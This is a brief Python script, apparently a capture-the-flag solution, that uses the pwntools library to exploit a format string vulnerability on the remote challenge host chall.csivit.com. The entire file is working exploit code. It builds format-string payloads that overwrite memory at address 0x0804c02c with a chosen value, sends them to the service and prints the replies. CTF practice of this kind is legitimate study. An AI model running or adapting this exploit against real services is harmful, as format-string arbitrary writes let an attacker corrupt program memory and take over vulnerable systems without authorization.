from pwn import *

def send_payload(payload):
	s = remote('chall.csivit.com', 30023)
	print(payload)
	s.sendline(payload)
	resp = s.recv()
	print(resp)
	return resp

format_string = FmtStr(execute_fmt=send_payload)
format_string.write(0x0804c02c, -0x4b24541d)
format_string.execute_writes()
